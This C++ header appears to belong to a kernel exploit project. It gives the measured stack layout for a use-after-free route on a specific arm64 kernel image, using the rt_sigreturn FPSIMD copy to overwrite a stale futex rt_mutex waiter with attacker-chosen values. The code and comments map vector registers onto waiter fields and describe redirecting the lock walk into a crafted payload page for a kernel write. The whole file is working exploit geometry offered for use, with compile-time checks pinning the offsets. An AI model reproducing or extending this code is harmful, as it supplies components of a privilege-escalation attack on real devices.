#ifndef GHOSTLOCK_RT_SIGRETURN_LAYOUT_H
#define GHOSTLOCK_RT_SIGRETURN_LAYOUT_H

#include <cstdint>

/* Static geometry for the rt_sigreturn middleware (kernel 6.6.58 DNN-AN00).
 *
 * Native __arm64_sys_rt_sigreturn restores a user signal frame and, on the
 * FPSIMD path, copies the 0x200-byte vector-register save area onto its own
 * kernel stack at sp+0x50. That buffer overlaps the stale rt_mutex_waiter left
 * by futex_wait_requeue_pi, so the copied vregs become waiter fields:
 *
 *   copy+0xd0 vregs[13] -> waiter bytes 0x00..0x10  (tree.rb_parent_color/right)
 *   copy+0xe0 vregs[14] -> waiter bytes 0x10..0x20  (tree.rb_left/prio)
 *   copy+0xf0 vregs[15] -> waiter bytes 0x20..0x30  (tree.deadline, pi_tree.rb_parent_color)
 *   copy+0x100 vregs[16] -> waiter bytes 0x30..0x40 (pi_tree.rb_right/left)
 *   copy+0x110 vregs[17] -> waiter bytes 0x40..0x50 (pi_tree.prio/deadline)
 *   copy+0x120 vregs[18] -> waiter 0x50 task, 0x58 lock
 *   copy+0x130 vregs[19] -> waiter 0x60 wake_state, 0x68 ww_ctx
 *
 * The 0x200-byte copy starts at SP0-0x280, i.e. it fully contains the waiter
 * [SP0-0x1b0, SP0-0x140). Unlike the pselect/sendmsg buffers (which only reach
 * the tail), the whole waiter is user-controlled; the route therefore defines
 * every covered vreg, including the head, instead of letting stray register
 * state leak in. The crafted rb nodes that carry the write target/value live in
 * the payload page that waiter->lock redirects the walk into, so the stack
 * waiter only has to supply task/lock/wake_state (the select route overwrites
 * the same head today).
 *
 * Kernel-side numbers were measured on the target image:
 *   __arm64_sys_rt_sigreturn prologue: stp x29,x30,[sp,#-0x60]! + sub sp,#0x270
 *     => frame depth 0x2d0
 *   memset(sp+0x50, 0, 0x210) before the import
 *   cmp wsize, #0x210 gating the FPSIMD record
 *   add x0, sp, #0x50 / mov w2, #0x200 / bl __arch_copy_from_user
 *   copy source: record + 0x10 (struct fpsimd_context.vregs)
 *
 * Everything below is pure arithmetic so the host test can pin it. */

namespace ghostlock::route::rt_sigreturn {
    /* ---- kernel-side geometry (measured on the target image) ---- */
    inline constexpr uint32_t kKernelFrameDepth = 0x2d0;
    inline constexpr uint32_t kKernelBufferFrameOffset = 0x50;
    inline constexpr uint32_t kKernelBufferStart =
            kKernelFrameDepth - kKernelBufferFrameOffset; /* 0x280 from SP0 */
    inline constexpr uint32_t kKernelMemsetLength = 0x210;
    inline constexpr uint32_t kKernelCopyLength = 0x200;

    /* Stale waiter coordinate (same convention as the select/sendmsg routes). */
    inline constexpr uint32_t kWaiterTreeFromSp0 = 0x1b0;       /* waiter+0x00 */
    inline constexpr uint32_t kWaiterPiTreeFromSp0 = 0x188;     /* waiter+0x28 */
    inline constexpr uint32_t kWaiterTaskFromSp0 = 0x160;       /* waiter+0x50 */
    inline constexpr uint32_t kWaiterLockFromSp0 = 0x158;       /* waiter+0x58 */
    inline constexpr uint32_t kWaiterWakeStateFromSp0 = 0x150;  /* waiter+0x60 */
    inline constexpr uint32_t kWaiterWwCtxFromSp0 = 0x148;      /* waiter+0x68 */

    /* Byte offset of each waiter field inside the copied buffer. */
    inline constexpr uint32_t kTreeCopyOffset =
            kKernelBufferStart - kWaiterTreeFromSp0;      /* 0x0d0 */
    inline constexpr uint32_t kPiTreeCopyOffset =
            kKernelBufferStart - kWaiterPiTreeFromSp0;    /* 0x0f8 */
    inline constexpr uint32_t kTaskCopyOffset =
            kKernelBufferStart - kWaiterTaskFromSp0;      /* 0x120 */
    inline constexpr uint32_t kLockCopyOffset =
            kKernelBufferStart - kWaiterLockFromSp0;      /* 0x128 */
    inline constexpr uint32_t kWakeStateCopyOffset =
            kKernelBufferStart - kWaiterWakeStateFromSp0; /* 0x130 */
    inline constexpr uint32_t kWwCtxCopyOffset =
            kKernelBufferStart - kWaiterWwCtxFromSp0;     /* 0x138 */

    /* The waiter spans [kTreeCopyOffset, kWaiterEndCopyOffset). */
    inline constexpr uint32_t kWaiterEndCopyOffset = kWwCtxCopyOffset + 0x08; /* 0x140 */
    inline constexpr uint32_t kWaiterCopyBytes =
            kWaiterEndCopyOffset - kTreeCopyOffset;                           /* 0x070 */

    /* FPSIMD vregs: 32 sixteen-byte lanes; copy offset O is in lane O/16, half
     * (O%16)/8. */
    inline constexpr uint32_t kVregBytes = 16;

    constexpr uint32_t vreg_of(uint32_t copy_offset) noexcept {
        return copy_offset / kVregBytes;
    }

    constexpr uint32_t half_of(uint32_t copy_offset) noexcept {
        return (copy_offset % kVregBytes) / 8;
    }

    inline constexpr uint32_t kTreeVreg = vreg_of(kTreeCopyOffset);        /* 13 */
    inline constexpr uint32_t kPiTreeVreg = vreg_of(kPiTreeCopyOffset);    /* 15 */
    inline constexpr uint32_t kTaskVreg = vreg_of(kTaskCopyOffset);        /* 18 */
    inline constexpr uint32_t kLockVreg = vreg_of(kLockCopyOffset);        /* 18 */
    inline constexpr uint32_t kWakeVreg = vreg_of(kWakeStateCopyOffset);   /* 19 */
    inline constexpr uint32_t kWwCtxVreg = vreg_of(kWwCtxCopyOffset);      /* 19 */
    inline constexpr uint32_t kTaskHalf = half_of(kTaskCopyOffset);        /* 0 */
    inline constexpr uint32_t kLockHalf = half_of(kLockCopyOffset);        /* 1 */
    inline constexpr uint32_t kWakeHalf = half_of(kWakeStateCopyOffset);   /* 0 */
    inline constexpr uint32_t kWwCtxHalf = half_of(kWwCtxCopyOffset);      /* 1 */

    /* v13..v19 are the only vregs that land inside the waiter; the route
     * defines all of them. */
    inline constexpr uint32_t kFirstWaiterVreg = kTreeVreg;                /* 13 */
    inline constexpr uint32_t kLastWaiterVreg = kWakeVreg;                 /* 19 */

    /* wake_state value the image's own futex_wait_requeue_pi installs
     * (mov w8,#3 -> str w8,[sp,#0xf0] on the target image). 3 is the task-state
     * bit pattern TASK_NORMAL (TASK_INTERRUPTIBLE|TASK_UNINTERRUPTIBLE), NOT an
     * rt_mutex chainwalk code: RT_MUTEX_FULL_CHAINWALK is 1, not a wake_state. */
    inline constexpr uint32_t kWakeStateValue = 3;

    /* ---- compile-time placement checks ---- */
    static_assert(kKernelBufferStart == 0x280);
    static_assert(kTaskCopyOffset == 0x120);
    static_assert(kLockCopyOffset == 0x128);
    static_assert(kWakeStateCopyOffset == 0x130);
    static_assert(kWwCtxCopyOffset == 0x138);
    static_assert(kTreeCopyOffset == 0x0d0);
    static_assert(kWaiterCopyBytes == 0x70);
    static_assert(kFirstWaiterVreg == 13 && kLastWaiterVreg == 19);

    /* task/lock share one lane, wake_state/ww_ctx share the next. */
    static_assert(kLockVreg == kTaskVreg && kTaskHalf == 0 && kLockHalf == 1);
    static_assert(kWwCtxVreg == kWakeVreg && kWakeHalf == 0 && kWwCtxHalf == 1);

    /* The copy must reach every waiter byte, and the memset must cover it too so
     * no untouched head word survives into the walk. */
    static_assert(kWaiterEndCopyOffset <= kKernelCopyLength);
    static_assert(kTreeCopyOffset >= kKernelBufferStart - kKernelMemsetLength);
} // namespace ghostlock::route::rt_sigreturn

#endif
